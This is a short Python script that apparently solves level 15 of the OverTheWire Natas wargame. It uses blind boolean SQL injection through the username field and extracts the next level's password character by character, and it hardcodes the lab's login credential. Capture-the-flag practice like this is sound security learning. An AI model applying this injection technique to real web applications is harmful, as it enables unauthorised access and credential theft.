#REGEXP does not work in this for some reason 

import requests                     # type: ignore

searchspace="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password=""

fixquery='natas16" and password REGEXP BINARY "^'



url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
data = { "username": "peer" }


for k in range(32):
    for i in range(62):
        query=fixquery+password+searchspace[i];
        data["username"]= query
        print(query)
        r = requests.post(url, data=data, auth=auth)
        if "This user exists" in r.text:
            password+=searchspace[i]
            print(f"found: {password}")
            break
        else:   
            print(False)

print(f"password is {password}")





